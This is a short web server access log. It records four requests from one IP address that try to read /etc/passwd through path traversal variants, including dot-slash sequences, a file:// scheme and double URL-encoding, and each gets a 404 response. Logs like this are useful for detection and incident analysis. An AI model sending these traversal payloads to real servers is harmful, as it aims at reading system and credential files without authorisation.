203.141.138.55 - - [20/Dec/2019:08:27:57 +0000] "GET /dfi/.../....///.../....///.../....///.../....///.../....///.../....///etc/passwd?template=style_materialize.html HTTP/1.1" 404 1136
203.141.138.55 - - [20/Dec/2019:08:27:57 +0000] "GET /dfi/.../...//.../...//.../...//.../...//.../...//.../...//.../...//.../...//etc/passwd?template=style_materialize.html HTTP/1.1" 404 1148
203.141.138.55 - - [20/Dec/2019:08:27:57 +0000] "GET /dfi/file%3a///etc/passwd?template=style_materialize.html HTTP/1.1" 404 1024
203.141.138.55 - - [20/Dec/2019:08:27:58 +0000] "GET /dfi/%252fetc%252fpasswd?template=style_materialize.html HTTP/1.1" 404 1022
